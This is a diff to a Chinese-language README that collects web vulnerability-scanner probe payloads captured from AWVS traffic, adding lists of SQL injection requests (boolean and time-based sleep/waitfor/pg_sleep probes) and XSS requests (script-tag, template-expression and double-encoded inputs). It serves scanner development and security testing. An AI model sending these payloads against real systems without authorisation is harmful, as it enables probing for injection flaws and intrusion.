@@ -1,6 +1,6 @@
 # WEB 漏扫 payload 收集
 
-从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考，payload 中的无规律字符和均为 payload 随机生成
+从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考，payload 中的无规律字符和均为 payload 随机生成，部分漏洞扫描场景很复杂，必须要满足特定条件才能触发相应的 payload，所以最终payload 可能获取不全
 
 漏洞检测基本原则：
 - 随机性
@@ -114,3 +114,47 @@ GET /ssrf.php?_url=http://127.0.0.1:43017#@domain.com/i/e0c8ee/dogy/xsuy/
 ```
 
 ## AWVS 篇
+### SQL 注入
+```
+GET /sqli.php?name=1'"
+GET /sqli.php?name=1%00%C0%A7%C0%A2%252527%252522
+GET /sqli.php?name=%40%408Ex4Q 
+GET /sqli.php?name=%BF'%BF"
+GET /sqli.php?name=%F0''%F0""
+GET /sqli.php?name=-1%20OR%202%2B877-877-1=0%2B0%2B0%2B1%20--%20 
+GET /sqli.php?name=-1%20OR%203%2B877-877-1=0%2B0%2B0%2B1%20--%20
+GET /sqli.php?name=-1%20OR%202%2B19-19-1=0%2B0%2B0%2B1
+GET /sqli.php?name=-1%20OR%203%2B19-19-1=0%2B0%2B0%2B1 
+GET /sqli.php?name=-1'%20OR%202%2B642-642-1=0%2B0%2B0%2B1%20--%20
+GET /sqli.php?name=-1'%20OR%203%2B642-642-1=0%2B0%2B0%2B1%20--%20
+GET /sqli.php?name=-1'%20OR%202%2B659-659-1=0%2B0%2B0%2B1%20or%20'jfLRuQDq'='
+GET /sqli.php?name=-1'%20OR%203%2B659-659-1=0%2B0%2B0%2B1%20or%20'jfLRuQDq'='
+GET /sqli.php?name=-1"%20OR%202%2B133-133-1=0%2B0%2B0%2B1%20--%20
+GET /sqli.php?name=-1"%20OR%203%2B133-133-1=0%2B0%2B0%2B1%20--%20
+GET /sqli.php?name=if(now()=sysdate()%2Csleep(4)%2C0)
+GET /sqli.php?name=0'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z
+GET /sqli.php?name=0"XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR"Z
+GET /sqli.php?name=(select(0)from(select(sleep(4)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'"%2B(select(0)from(select(sleep(4)))v)%2B"*/
+GET /sqli.php?name=1%20waitfor%20delay%20'0:0:4'%20--%20
+GET /sqli.php?name=xYjQiuCb';%20waitfor%20delay%20'0:0:4'%20--%20
+GET /sqli.php?name=BtkSXz3D';select%20pg_sleep(6);%20--%20
+GET /sqli.php?name=ni84nZ93');select%20pg_sleep(6);%20--%20
+GET /sqli.php?name=k8vjVJMd'));select%20pg_sleep(6);%20--%20 
+```
+### XSS
+```
+GET /xss.php?name=HttP://bxss.me/t/xss.html?%00
+GET /xss.php?name=test'"()&%<acx><ScRiPt >HS1L(9479)</ScRiPt>
+GET /xss.php?name='"()%26%25<acx><ScRiPt%20>QZWL(9781)</ScRiPt>
+GET /xss.php?name=bxss.me/t/xss.html?%00
+GET /xss.php?name=test9565139 
+GET /xss.php?name=test9565139<
+GET /xss.php?name=acu7581%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca7581
+GET /xss.php?name=acux3233%C0%BEz1%C0%BCz2a%90bcxuca3233
+GET /xss.php?name={{49286*49078}}
+GET /xss.php?name=test9279'();}]9817
+GET /xss.php?wvstest=javascript:domxssExecutionSink(1,"'/"%3E%3Cxsstag%3E()locxss")
+GET /xss.php?name=%2574%2565%2573%2574%2539%2537%2535%2530%2527%2528%2529%253B%257D%255D%2539%2534%2538%2538    # 两次 urlencode
+GET /xss.php?name=test</script><script>V5vL(9783)</script>
+GET /xss.php?name=test<W7PZRN>WTTZZ[!%2B!]</W7PZRN>
+```
